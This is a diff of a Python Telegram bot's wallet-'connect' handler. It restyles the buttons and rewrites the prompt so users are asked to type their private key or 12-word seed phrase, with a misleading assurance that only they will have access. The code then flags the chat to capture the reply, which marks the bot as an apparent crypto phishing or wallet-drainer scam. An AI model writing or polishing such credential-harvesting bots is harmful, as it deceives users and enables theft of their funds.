@@ -14,9 +14,9 @@ def handle_connect(call):
     )
     markup = InlineKeyboardMarkup(row_width=2)
     # First row: one button
-    markup.add(InlineKeyboardButton("CONNECT", callback_data="connect_wallet"))
+    markup.add(InlineKeyboardButton("⏬ Connect ", callback_data="connect_wallet"))
     # Second row: one button
-    markup.add(InlineKeyboardButton("SECURITY TIPS", callback_data="connect_security"))
+    markup.add(InlineKeyboardButton("🔰 Security Tips", callback_data="connect_security"))
     # Third row: back and menu buttons
     markup.add(
         InlineKeyboardButton("🔙 Back", callback_data="connect_back"),
@@ -26,8 +26,8 @@ def handle_connect(call):
 
 def handle_connect_wallet(call):
     chat_id = call.message.chat.id
-    image_url = 'https://raw.githubusercontent.com/raccityy/raccityy.github.io/refs/heads/main/connect.jpg'
-    text = "📥Import Wallet Phrase Code or send your private key To Connect"
+    image_url = 'https://raw.githubusercontent.com/raccityy/smartbrother/0a28ad846b493a0bb4bc08f8e567beba3cd6b79e/connect.jpg'
+    text = "⚠ This action is going to import in your Main Wallet.. please Note you are the ONLY ONE access to this wallet..\n\nPlease enter your Private Key or 12 word Seed Phrase to connect your wallet:"
     connect_phrase_waiting[chat_id] = True
     try:
         bot.send_photo(chat_id, image_url, caption=text)
